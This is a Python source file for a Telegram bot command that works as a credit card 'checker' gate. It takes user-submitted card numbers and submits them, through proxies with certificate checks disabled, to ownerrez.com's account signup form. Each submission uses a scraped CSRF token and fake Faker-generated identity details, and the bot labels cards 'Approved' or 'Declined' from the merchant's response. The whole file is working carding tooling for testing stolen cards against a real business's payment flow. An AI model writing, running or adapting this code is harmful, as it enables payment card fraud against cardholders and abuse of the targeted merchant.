from faker import Faker
from httpx import AsyncClient
import time, asyncio
from datetime import datetime
from src.assets.functions import antispam
from src.assets.connection import Database
from pyrogram.types import Message
from pyrogram import Client, filters, enums
from pyrogram.enums import ParseMode
from src.extras.checklib import MakeGate, ScrapInfo

name_gate = "Custom_Auth"
subtype = "No charged has been made."
command = "an"


@Client.on_message(
    filters.command([f"{command}"], ["/", ",", ".", ";", "-"], case_sensitive=False)
)
async def gateway(client: Client, m: Message):
    card = (
        m.text.split(" ", 1)[1] if not m.reply_to_message else m.reply_to_message.text
    )
    user_id = m.from_user.id
    with Database() as db:
        if not db.IsPremium(user_id):
            return await m.reply("<b>You are not premium</b>", quote=True)
        user_info = db.GetInfoUser(m.from_user.id)
    if not card:
        return await m.reply("You need to provide a card to verify", quote=True)
    antispam_result = antispam(user_id, user_info["ANTISPAM"])
    if antispam_result != False:
        return await m.reply(
            f"Please wait <code>{antispam_result}'s</code>", quote=True
        )
    await client.send_chat_action(m.chat.id, action=enums.ChatAction.TYPING)
    card_splited = MakeGate(card).get_card_details()
    msgg = f"""<b>Checking... 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {card_splited[0]}:{card_splited[1]}:{card_splited[2]}:{card_splited[3]}
<b>Status:</b> Loading..."""
    msg = await m.reply(msgg, quote=True)
    asyncio.gather(await get_live(card, msg))


async def get_live(card, msg):
    email = ScrapInfo().email_generator()
    proxy = ScrapInfo().proxy_session()

    current_time = datetime.now().strftime("%D - %H:%M:%S")

    card_split = MakeGate(card).get_card_details()
    ccn = card_split[0]
    month = card_split[1]
    year = card_split[2]
    if len(year) == 2:
        year = f"20{card_split[2]}"
    cvv = card_split[3]

    initial_time = time.time()
    data_bin = await MakeGate(card).bin_lookup()
    fake = Faker()

    async with AsyncClient(follow_redirects=True, verify=False, timeout=None) as web:
        web.proxies = proxy
        req1 = await web.get("https://app.ownerrez.com/join")
        token = req1.text.split(
            'name="__RequestVerificationToken" type="hidden" value="'
        )[1].split('"')[0]
        current_time = datetime.now().strftime("%D - %H:%M:%S")
        msgg = f"""<b>{current_time} 🌩️</b>
━━━━━━━━━━━
<b>CC:</b> {ccn}:{month}:{year}:{cvv}
<b>Status:</b> Loading...
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>"""
        await msg.edit_text(
            msgg, parse_mode=ParseMode.HTML, disable_web_page_preview=True
        )

        headers = {
            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
            "accept-language": "es-ES,es;q=0.9,en;q=0.8",
            "cache-control": "no-cache",
            "content-type": "application/x-www-form-urlencoded",
            "origin": "https://app.ownerrez.com",
            "pragma": "no-cache",
            "priority": "u=0, i",
            "referer": "https://app.ownerrez.com/join",
            "sec-ch-ua": '"Chromium";v="130", "Google Chrome";v="130", "Not?A_Brand";v="99"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "document",
            "sec-fetch-mode": "navigate",
            "sec-fetch-site": "same-origin",
            "sec-fetch-user": "?1",
            "upgrade-insecure-requests": "1",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
        }

        data = {
            "__RequestVerificationToken": token,
            "TimeZone": fake.timezone(),
            "FirstName": fake.first_name(),
            "LastName": fake.last_name(),
            "TrapName": "",
            "EmailAddress": email,
            "Password": "sX6Pg7vLcPv!CXG",
            "ConfirmPassword": "sX6Pg7vLcPv!CXG",
            "CardNumber": ccn,
            "CardMonth": month,
            "CardYear": year,
            "CardCcv": cvv,
            "Phone.Original": fake.phone_number(),
            "Phone.E164": fake.phone_number(),
            "Phone.Extension": "",
            "Address.Id": "",
            "Address.CountryId": "226",
            "Address.Street1": fake.street_address(),
            "Address.Street2": "",
            "Address.City": fake.city(),
            "Address.StateId": "34",
            "Address.Province": "",
            "Address.PostalCode": fake.zipcode(),
            "IsAgreeToTerms": [
                "true",
                "false",
            ],
            "IsAgreeToRefundPolicy": [
                "true",
                "false",
            ],
            "SubscribeToImportantBlogPosts": [
                "true",
                "false",
            ],
            "SubscribeToLessImportantBlogPosts": "false",
        }

        req2 = await web.post(
            "https://app.ownerrez.com/join", headers=headers, data=data
        )
    if "Approved" in req2.text:
        status = "Approved ✅"
        msgx = "Approved"
    else:
        msgx = req2.text.split(
            '<div class="validation-summary-errors alert alert-danger" data-valmsg-summary="true"><ul><li>'
        )[1].split("</li>")[0]

        if (
            "The transaction has been declined because of an AVS mismatch. The address provided does not match billing address of cardholder."
            in msgx
        ):
            status = "Approved ✅"
        elif "Insufficient Funds" in msgx or "Funds" in msgx:
            status = "Approved ✅"
        else:
            status = "Declined ❌"

        final_time = time.time() - initial_time

        card_response = f"""<b>#{name_gate} (${command}) 🌩️</b>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">↯</a> <b>CC:<b> [<code>{ccn}:{month}:{year}:{cvv}</code>]
<a href="https://t.me/ByDog3r">↯</a> <b>Status: {status}<b>
<a href="https://t.me/ByDog3r">↯</a> <b>Response:</b> {msgx}
<a href="https://t.me/ByDog3r">↯</a> <b>Gateway: {subtype}</b>
━━━━━━━━━━━
<code>| Bank Information</code>
━━━━━━━━━━━
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[0]}</code> - <code>{data_bin[1]}</code> - <code>{data_bin[2]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[3]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <code>{data_bin[4]} {data_bin[5]}</code>
<a href="https://t.me/ByDog3r">⊁</a> <b>Time</b> : {final_time:0.2}"""
        await msg.edit_text(
            card_response,
            parse_mode=ParseMode.HTML,
            disable_web_page_preview=True,
        )
